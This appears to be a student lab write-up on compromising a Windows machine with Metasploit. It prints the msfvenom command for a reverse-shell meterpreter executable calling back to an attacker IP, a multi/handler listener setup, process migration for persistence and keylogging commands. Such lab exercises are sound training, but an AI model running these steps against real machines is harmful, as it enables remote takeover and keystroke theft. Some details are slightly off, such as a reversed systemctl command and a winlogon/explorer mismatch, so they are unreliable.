Compromising windows using Metasploit
# Metasploit
Compromising windows using Metasploit

# AIM:

To Compromise windows using Metasploit .

## DESIGN STEPS:

### Step 1:

Install kali linux either in partition or virtual box or in live mode

### Step 2:

Investigate on the various categories of tools as follows:

### Step 3:

Open terminal and try execute some kali linux commands

## EXECUTION STEPS AND ITS OUTPUT:

Find the attackers ip address using ifconfig
## OUTPUT:
<img width="955" height="314" alt="image" src="https://github.com/user-attachments/assets/412d2986-ff89-4fcb-916a-d4a29eeab03b" />

Create a malicious executable file fun.exe using msfvenom command
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.2 -f exe > fun.exe
## OUTPUT:
<img width="629" height="196" alt="Screenshot 2026-02-12 205035" src="https://github.com/user-attachments/assets/2c1e817d-9331-49b8-9061-544c0dc5599c" />

copy the fun.exe into the apache /var/www/html folder
## OUTPUT:
<img width="660" height="59" alt="image" src="https://github.com/user-attachments/assets/5f3c0613-715b-4322-b46d-68271b7dc330" />

Start apache server
sudo systemctl apache2 start
## OUTPUT:

<img width="508" height="49" alt="image" src="https://github.com/user-attachments/assets/643a6aca-6f34-4176-8312-e692573677c0" />

Check the status of apache2
## OUTPUT:
<img width="953" height="399" alt="image" src="https://github.com/user-attachments/assets/480a874d-1994-41b0-87bb-1745419e10de" />


Invoke msfconsole:
## OUTPUT:

<img width="948" height="526" alt="image" src="https://github.com/user-attachments/assets/2828f58b-3861-4ddd-bc5f-70671afe72c9" />

Type help or a question mark "?" to see the list of all available commands you can use inside msfconsole.
## OUTPUT:

<img width="929" height="617" alt="image" src="https://github.com/user-attachments/assets/c18fd1d3-d99d-429f-b6a6-8c2cb85f0ccd" />



Starting a command and control Server
use multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 0.0.0.0

## OUTPUT:
<img width="810" height="226" alt="image" src="https://github.com/user-attachments/assets/f3c72319-a088-45c1-95db-db6cf0568e79" />




On the target Windows machine, open a Web browser and open this URL, replacing the IP address with the IP address of your Kali machine:
http://192.168.1.2/fun.exe  ( Replace IP address appropriately)
The file "fun.exe" downloads. 
## OUTPUT:

<img width="810" height="670" alt="image" src="https://github.com/user-attachments/assets/db7fe947-76f6-4deb-8f38-9aee0fc52f39" />


Bypass any warning boxes, double-click the file, and allow it to run.
## OUTPUT:

<img width="644" height="487" alt="Screenshot 2026-02-12 202722" src="https://github.com/user-attachments/assets/e01a3f97-a741-4b77-b81c-7d28fda7b443" />


On kali/parrot give the command exploit
## OUTPUT:

<img width="498" height="52" alt="image" src="https://github.com/user-attachments/assets/1242dac8-8cc8-43a0-80c3-c26e14c70b72" />


To see a list of processes, at the meterpreter > prompt, execute this command:
ps  ⇒ can see the fun.exe process running with pid 1156
## OUTPUT:

<img width="407" height="147" alt="image" src="https://github.com/user-attachments/assets/e90c5d8b-9179-44d6-8291-31ceb61fa325" />


The Metasploit shell is running inside the "fun.exe" process. If the user closes that process, or logs off, the connection will be lost.
To become more persistent, we'll migrate to a process that will last longer.
Let's migrate to the winlogon process.
At the meterpreter > prompt, execute this command:

migrate -N explorer.exe
## OUTPUT:


<img width="757" height="439" alt="image" src="https://github.com/user-attachments/assets/a1c2fa7c-f117-402c-bc4d-b65ab54e3d67" />


at meterpreter > prompt, execute this command:
netstat
A list of network connections appears, including one to a remote port of 4444, as highlighted in the image below.
Notice the "PID/Program name" value for this connection, which is redacted 
## OUTPUT:

<img width="585" height="41" alt="image" src="https://github.com/user-attachments/assets/c31f29c4-96af-41d7-8edd-a7fd73e6f495" />

Post Exploitation
The target is now owned. Following are meterpreter commands for key capturing in the target machine
keyscan_start	Begins capturing keys typed in the target. On the Windows target, open Notepad and type in some text, such as your name.
## OUTPUT:


<img width="550" height="358" alt="image" src="https://github.com/user-attachments/assets/51697800-4f9d-4cec-9c08-a1082e043c17" />


keyscan_dump	Shows the keystrokes captured so far
## OUTPUT:

<img width="552" height="217" alt="image" src="https://github.com/user-attachments/assets/5d4dbcd6-7069-41c9-bdfa-6bfbbb86b2dc" />


## RESULT:
The Metasploit framework is  used to compromise windows and is examined successfully.



